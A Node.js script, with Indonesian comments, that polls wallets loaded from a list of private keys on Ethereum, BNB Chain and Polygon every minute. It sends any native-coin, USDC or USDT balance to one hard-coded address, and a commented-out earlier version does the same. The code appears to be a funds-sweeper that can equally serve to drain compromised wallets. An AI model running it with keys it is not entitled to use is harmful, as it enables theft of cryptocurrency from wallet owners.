const { ethers } = require("ethers");
const { parseEther, parseUnits, formatUnits, formatEther } = ethers; // Extract specific utility functions
const fs = require("fs");
require("dotenv").config();



// Validasi environment variables
if (!process.env.PRIVATE_KEYS || !process.env.INFURA_PROJECT_ID) {
    throw new Error("Missing required environment variables: PRIVATE_KEYS or INFURA_PROJECT_ID.");
}

// Konfigurasi jaringan menggunakan Infura
const networks = {
    ethereum: {
        chainId: 1,
        name: "ethereum",
        rpcUrls: [`https://mainnet.infura.io/v3/${process.env.INFURA_PROJECT_ID}`],
        tokens: {
            USDC: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
            USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
        },
    },
    bnb: {
        chainId: 56,
        name: "bnb",
        rpcUrls: [`https://bsc-mainnet.infura.io/v3/${process.env.INFURA_PROJECT_ID}`],
        tokens: {
            USDC: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
            USDT: "0x55d398326f99059fF775485246999027B3197955",
        },
    },
    polygon: {
        chainId: 137,
        name: "polygon",
        rpcUrls: [`https://polygon-mainnet.infura.io/v3/${process.env.INFURA_PROJECT_ID}`],
        tokens: {
            USDC: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359",
            USDT: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
        },
    },
};

// Konstanta
const MAX_RETRIES = 3;
const RETRY_DELAY = 2000; // Dalam milidetik
const MIN_NATIVE_BALANCE = ethers.parseEther("0.001"); // Minimum native balance
const MIN_TOKEN_BALANCE =  ethers.parseUnits("40", 6);// Minimum token balance
const EXCHANGE_WALLET = "0xEC6c09E7024900a25AA69d01812aDFF01D50DC68";
const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function transfer(address to, uint256 amount) returns (bool)",
];

// Load private keys and initialize wallets
const PRIVATE_KEYS = process.env.PRIVATE_KEYS.split(",");
const wallets = PRIVATE_KEYS.map((key) => new ethers.Wallet(key));

// Provider cache
const providerCache = new Map();

// Logging function
function logMessage(message) {
    const timestamp = new Date().toISOString();
    console.log(`${timestamp} - ${message}`);
    fs.appendFileSync("transactions.log", `${timestamp} - ${message}\n`);
}

// Get provider function
function getProvider(networkConfig) {
    const cacheKey = `${networkConfig.chainId}`;
    if (providerCache.has(cacheKey)) {
        return providerCache.get(cacheKey);
    }

    const provider = new ethers.JsonRpcProvider(networkConfig.rpcUrls[0], {
        chainId: networkConfig.chainId,
        name: networkConfig.name,
        staticNetwork: true,
    });

    providerCache.set(cacheKey, provider);
    return provider;
}

// Process wallet function
async function processWallet(wallet) {
    for (const networkConfig of Object.values(networks)) {
        let retries = 0;
        while (retries < MAX_RETRIES) {
            try {
                await checkAndProcessBalances(wallet, networkConfig);
                break;
            } catch (error) {
                retries++;
                if (retries === MAX_RETRIES) {
                    logMessage(`Failed to process wallet ${wallet.address} on ${networkConfig.name} after ${MAX_RETRIES} retries: ${error.message}`);
                } else {
                    await new Promise((resolve) => setTimeout(resolve, RETRY_DELAY));
                }
            }
        }
        await new Promise((resolve) => setTimeout(resolve, 2000));
    }
}

// Check and process balances
async function checkAndProcessBalances(wallet, networkConfig) {
    const provider = getProvider(networkConfig);

    try {
        await provider.getNetwork();

        // Check native token balance
        const nativeBalance = await provider.getBalance(wallet.address);
        logMessage(`Wallet ${wallet.address} native balance on ${networkConfig.name}: ${formatEther(nativeBalance)}`);

        if (nativeBalance >= MIN_NATIVE_BALANCE) {
            await sendNativeFunds(wallet, networkConfig, nativeBalance);
        }

        // Check ERC-20 token balances
        for (const tokenSymbol of ["USDC", "USDT"]) {
            const tokenAddress = networkConfig.tokens[tokenSymbol];
            if (!tokenAddress) continue;

            const tokenContract = getContract(tokenAddress, ERC20_ABI, provider);

            const tokenBalance = await tokenContract.balanceOf(wallet.address);
            logMessage(`Wallet ${wallet.address} ${tokenSymbol} balance on ${networkConfig.name}: ${formatUnits(tokenBalance, 6)}`);

            if (tokenBalance >= MIN_TOKEN_BALANCE) {
                await sendTokens(wallet, networkConfig, tokenSymbol, tokenBalance);
            }
        }
    } catch (error) {
        throw new Error(`Network error on ${networkConfig.name}: ${error.message}`);
    }
}

// Get contract helper
function getContract(address, abi, provider) {
    return new ethers.Contract(address, abi, provider);
}

// Send native funds
async function sendNativeFunds(wallet, networkConfig, balance) {
    const provider = getProvider(networkConfig);
    const signer = wallet.connect(provider);

    try {
        const gasPrice = await provider.getFeeData();
        const gasLimit = 21000n;
        const gasCost = gasPrice.gasPrice * gasLimit;
        const sendAmount = balance - gasCost;

        if (sendAmount <= 0n) {
            logMessage(`Insufficient balance to cover gas fees for wallet ${wallet.address}`);
            return;
        }

        const tx = {
            to: EXCHANGE_WALLET,
            value: sendAmount,
            gasLimit: Number(gasLimit),
            gasPrice: gasPrice.gasPrice,
        };

        logMessage(`Sending ${formatEther(sendAmount)} ${networkConfig.name} from ${wallet.address} to ${EXCHANGE_WALLET}`);
        const transaction = await signer.sendTransaction(tx);
        await transaction.wait();
        logMessage(`Transaction confirmed: ${transaction.hash}`);
    } catch (error) {
        logMessage(`Error sending native funds for wallet ${wallet.address}: ${error.message}`);
    }
}

// Send tokens
async function sendTokens(wallet, networkConfig, tokenSymbol, balance) {
    const provider = getProvider(networkConfig);
    const signer = wallet.connect(provider);

    const tokenAddress = networkConfig.tokens[tokenSymbol];
    const tokenContract = getContract(tokenAddress, ERC20_ABI, signer);

    try {
        logMessage(`Sending ${formatUnits(balance, 6)} ${tokenSymbol} from ${wallet.address} to ${EXCHANGE_WALLET}`);
        const tx = await tokenContract.transfer(EXCHANGE_WALLET, balance);
        await tx.wait();
        logMessage(`Transaction confirmed: ${tx.hash}`);
    } catch (error) {
        logMessage(`Error sending ${tokenSymbol} for wallet ${wallet.address}: ${error.message}`);
    }
}

// Monitor wallets every 60 seconds
async function monitorWallets() {
    for (const wallet of wallets) {
        await processWallet(wallet);
    }
}

setInterval(() => {
    monitorWallets().catch((error) => logMessage(`Monitoring error: ${error.message}`));
}, 60 * 1000);

// const { ethers } = require("ethers");
// const fs = require("fs");
// const PQueue = require('p-queue').default;
// require("dotenv").config();

// // Load environment variables
// if (!process.env.PRIVATE_KEYS || !process.env.INFURA_PROJECT_ID) {
//     throw new Error("Missing required environment variables");
// }

// const PRIVATE_KEYS = process.env.PRIVATE_KEYS.split(",");
// const EXCHANGE_WALLET = process.env.EXCHANGE_WALLET || "0xEC6c09E7024900a25AA69d01812aDFF01D50DC68";
// const LOG_FILE = "transactions.log";

// // Constants
// const MIN_NATIVE_BALANCE = ethers.parseEther("0.001");
// const MIN_TOKEN_BALANCE = ethers.parseUnits("40", 6);

// // Network configurations with chainIds
// const networks = {
//     ethereum: {
//         chainId: 1,
//         name: 'ethereum',
//         rpcUrls: [
//             `https://mainnet.infura.io/v3/${process.env.INFURA_PROJECT_ID}`,
//             "https://eth.llamarpc.com"
//         ],
//         tokens: {
//             USDC: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
//             USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7"
//         }
//     },
//     bnb: {
//         chainId: 56,
//         name: 'bnb',
//         rpcUrls: [
//             "https://bsc-dataseed.binance.org",
//             "https://bsc-dataseed1.defibit.io"
//         ],
//         tokens: {
//             USDC: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
//             USDT: "0x55d398326f99059fF775485246999027B3197955"
//         }
//     },
//     polygon: {
//         chainId: 137,
//         name: 'polygon',
//         rpcUrls: [
//             `https://polygon-mainnet.infura.io/v3/${process.env.INFURA_PROJECT_ID}`,
//             "https://polygon-rpc.com"
//         ],
//         tokens: {
//             USDC: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359",
//             USDT: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F"
//         }
//     }
// };

// const ERC20_ABI = [
//     "function balanceOf(address owner) view returns (uint256)",
//     "function transfer(address to, uint256 amount) returns (bool)"
// ];

// // Provider and contract cache using network chainId
// const providerCache = new Map();
// const contractCache = new Map();

// // Configuration
// const BATCH_SIZE = 5;
// const BATCH_INTERVAL = 12000;
// const RETRY_DELAY = 5000;
// const MAX_RETRIES = 3;

// function getProvider(networkConfig) {
//     const cacheKey = `${networkConfig.chainId}`;
//     if (providerCache.has(cacheKey)) {
//         return providerCache.get(cacheKey);
//     }

//     const providers = networkConfig.rpcUrls.map((url, i) => ({
//         provider: new ethers.JsonRpcProvider(url, {
//             chainId: networkConfig.chainId,
//             name: networkConfig.name
//         }),
//         priority: i,
//         stallTimeout: 2000
//     }));

//     const provider = new ethers.FallbackProvider(providers, 1);
//     providerCache.set(cacheKey, provider);
//     return provider;
// }

// function getContract(address, abi, provider, chainId) {
//     const key = `${address}-${chainId}`;
//     if (contractCache.has(key)) {
//         return contractCache.get(key);
//     }

//     const contract = new ethers.Contract(address, abi, provider);
//     contractCache.set(key, contract);
//     return contract;
// }

// function logMessage(message) {
//     const timestamp = new Date().toISOString();
//     const logEntry = `${timestamp} - ${message}\n`;
//     console.log(logEntry.trim());
//     try {
//         fs.appendFileSync(LOG_FILE, logEntry);
//     } catch (error) {
//         console.error(`Failed to write to log file: ${error.message}`);
//     }
// }

// async function sendNativeFunds(wallet, networkConfig, balance) {
//     try {
//         const provider = getProvider(networkConfig);
//         const signer = wallet.connect(provider);

//         const gasPrice = await provider.getFeeData();
//         const gasFee = gasPrice.gasPrice * BigInt(21000);
//         const sendAmount = balance - gasFee;

//         if (sendAmount <= BigInt(0)) {
//             throw new Error("Amount after gas fees would be zero or negative");
//         }

//         const tx = {
//             to: EXCHANGE_WALLET,
//             value: sendAmount,
//             gasLimit: 21000,
//             maxFeePerGas: gasPrice.maxFeePerGas || gasPrice.gasPrice,
//             maxPriorityFeePerGas: gasPrice.maxPriorityFeePerGas || ethers.parseUnits("2", "gwei")
//         };

//         logMessage(`Sending ${ethers.formatEther(sendAmount)} ${networkConfig.name} from ${signer.address}`);
//         const transaction = await signer.sendTransaction(tx);
//         await transaction.wait();
//         logMessage(`Transaction confirmed. Hash: ${transaction.hash}`);
//     } catch (error) {
//         logMessage(`Error sending native funds from ${wallet.address} on ${networkConfig.name}: ${error.message}`);
//     }
// }

// async function sendTokens(wallet, networkConfig, tokenSymbol, balance) {
//     try {
//         const provider = getProvider(networkConfig);
//         const signer = wallet.connect(provider);
//         const tokenAddress = networkConfig.tokens[tokenSymbol];
//         const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);

//         logMessage(`Sending ${ethers.formatUnits(balance, 6)} ${tokenSymbol} from ${signer.address}`);
//         const transaction = await tokenContract.transfer(EXCHANGE_WALLET, balance);
//         await transaction.wait();
//         logMessage(`Transaction confirmed. Hash: ${transaction.hash}`);
//     } catch (error) {
//         logMessage(`Error sending ${tokenSymbol} from ${wallet.address} on ${networkConfig.name}: ${error.message}`);
//     }
// }

// async function checkAndProcessBalances(wallet, networkConfig) {
//     const provider = getProvider(networkConfig);
    
//     // Check native token balance
//     const nativeBalance = await provider.getBalance(wallet.address);
//     logMessage(`Wallet ${wallet.address} native balance on ${networkConfig.name}: ${ethers.formatEther(nativeBalance)}`);

//     if (nativeBalance >= MIN_NATIVE_BALANCE) {
//         await sendNativeFunds(wallet, networkConfig, nativeBalance);
//     }

//     // Check ERC-20 token balances
//     for (const tokenSymbol of ["USDC", "USDT"]) {
//         const tokenAddress = networkConfig.tokens[tokenSymbol];
//         if (!tokenAddress) continue;

//         const tokenContract = getContract(
//             tokenAddress, 
//             ERC20_ABI, 
//             provider,
//             networkConfig.chainId
//         );
        
//         try {
//             const tokenBalance = await tokenContract.balanceOf(wallet.address);
//             logMessage(`Wallet ${wallet.address} ${tokenSymbol} balance on ${networkConfig.name}: ${ethers.formatUnits(tokenBalance, 6)}`);

//             if (tokenBalance >= MIN_TOKEN_BALANCE) {
//                 await sendTokens(wallet, networkConfig, tokenSymbol, tokenBalance);
//             }
//         } catch (error) {
//             logMessage(`Error checking ${tokenSymbol} balance: ${error.message}`);
//         }
//     }
// }

// async function processWallet(wallet, index) {
//     for (const networkConfig of Object.values(networks)) {
//         let retries = 0;
//         while (retries < MAX_RETRIES) {
//             try {
//                 await checkAndProcessBalances(wallet, networkConfig);
//                 break;
//             } catch (error) {
//                 retries++;
//                 if (retries === MAX_RETRIES) {
//                     logMessage(`Failed to process wallet ${wallet.address} on ${networkConfig.name} after ${MAX_RETRIES} retries: ${error.message}`);
//                 } else {
//                     await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
//                 }
//             }
//         }
//     }
// }

// async function processBatch(wallets, startIndex) {
//     const batch = wallets.slice(startIndex, startIndex + BATCH_SIZE);
//     const queue = new PQueue({ concurrency: 3 });
    
//     const promises = batch.map((wallet, i) => 
//         queue.add(() => processWallet(wallet, startIndex + i))
//     );
    
//     await Promise.all(promises);
// }

// async function monitorBalances() {
//     const startTime = Date.now();
//     const wallets = PRIVATE_KEYS.map(key => new ethers.Wallet(key));
    
//     for (let i = 0; i < wallets.length; i += BATCH_SIZE) {
//         await processBatch(wallets, i);
//         if (i + BATCH_SIZE < wallets.length) {
//             await new Promise(resolve => setTimeout(resolve, BATCH_INTERVAL));
//         }
//     }

//     const elapsedTime = (Date.now() - startTime) / 1000;
//     logMessage(`Monitoring cycle completed in ${elapsedTime.toFixed(2)} seconds`);
    
//     if (process.memoryUsage().heapUsed > 500 * 1024 * 1024) {
//         contractCache.clear();
//         global.gc && global.gc();
//     }
// }

// let isRunning = false;
// const MIN_INTERVAL = 60 * 1000;

// async function startMonitoring() {
//     while (true) {
//         if (!isRunning) {
//             isRunning = true;
//             const startTime = Date.now();
            
//             try {
//                 await monitorBalances();
//             } catch (error) {
//                 logMessage(`Critical monitoring error: ${error.message}`);
//             }
            
//             isRunning = false;
            
//             const executionTime = Date.now() - startTime;
//             const waitTime = Math.max(MIN_INTERVAL - executionTime, 0);
//             await new Promise(resolve => setTimeout(resolve, waitTime));
//         }
//     }
// }

// // Start the monitoring
// startMonitoring().catch(error => {
//     logMessage(`Fatal error: ${error.message}`);
//     process.exit(1);
// });